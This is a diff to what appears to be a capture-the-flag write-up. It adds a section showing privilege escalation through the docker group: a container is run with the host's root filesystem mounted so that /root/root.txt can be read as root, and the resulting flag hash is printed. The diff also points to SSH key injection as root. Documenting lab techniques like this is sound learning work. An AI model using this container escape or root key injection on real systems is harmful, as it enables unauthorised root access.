@@ -247,6 +247,28 @@ docker:x:111:alice
 
 ### Method 1: Unintended Path - Docker Escape via Volume Mount
 
+#### Reading Root Flag via Docker
+
+![Docker Escape - Root Access](/assets/img/03-docker-escape-root.jpg)
+
+Used Docker to read root flag directly via volume mount:
+
+````bash
+docker run --rm -v /:/mnt \
+--entrypoint /bin/sh \
+--user 0 \
+privatebin/nginx-fpm-alpine:2.0.2 \
+-c "cat /mnt/root/root.txt"
+````
+
+**Output:**
+
+5c7a6b6f4909f006b1d08d2b25d82c33
+
+
+#### SSH as root
+
+Now attempting SSH with injected key:
 #### SSH Key Injection
 
 Generated SSH keypair:
@@ -446,6 +468,7 @@ Accessed container shell and navigated to mounted host filesystem:
 cat /host/root/root.txt
 # 5c7a6b6f4909f006b1d08d2b25d82c33
 ```
+![Root Access via Arcane Portal](/assets/img/08-root-final.jpg)
 
 #### SSH Key Injection (Alternative)
 
